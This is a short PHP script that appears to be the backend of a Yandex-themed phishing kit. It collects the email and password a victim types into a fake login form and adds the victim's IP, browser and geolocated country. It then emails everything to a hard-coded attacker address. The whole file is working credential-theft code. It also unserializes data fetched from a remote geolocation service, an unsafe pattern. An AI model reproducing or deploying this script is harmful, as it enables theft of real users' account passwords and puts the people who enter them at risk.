<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];

if(isset($_GET['yandex'])){	
	$ip = getenv("REMOTE_ADDR");
	$data = array();
    $data['subject'] = ' Yandex | $ip';
    $data['browser'] = $country." ".$_SERVER['HTTP_USER_AGENT'];

    $data['message'] = 
    '
    	<html>
			<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
				<title>New Secure Login</title>
			</head>

			<body>
			    <p><strong>Email ID:</strong> '.$_REQUEST['email'].'</p>
			    <p><strong>Re-Password:</strong> '.$_REQUEST['password'].'</p>
			    <p><strong>Browser:</strong> '.$data['browser'].'</p>
			    <p><strong>IP:</strong> '.$ip.'</p>
			    <br>
			</body>
		</html>
    ';

    $mail->From = 'mexyinc@yandex.com';
    $mail->FromName = 'Yandex Login!';
    $mail->addAddress('mexyinc@yandex.com');   

	$mail->isHTML(true);
	$mail->Subject = $data['subject'];
	$mail->Body    = $data['message'];

	if(!$mail->send()) {
	    echo 'Message could not be sent.';
	    echo 'Mailer Error: ' . $mail->ErrorInfo;
	} else {
	    echo 'true';
	}
}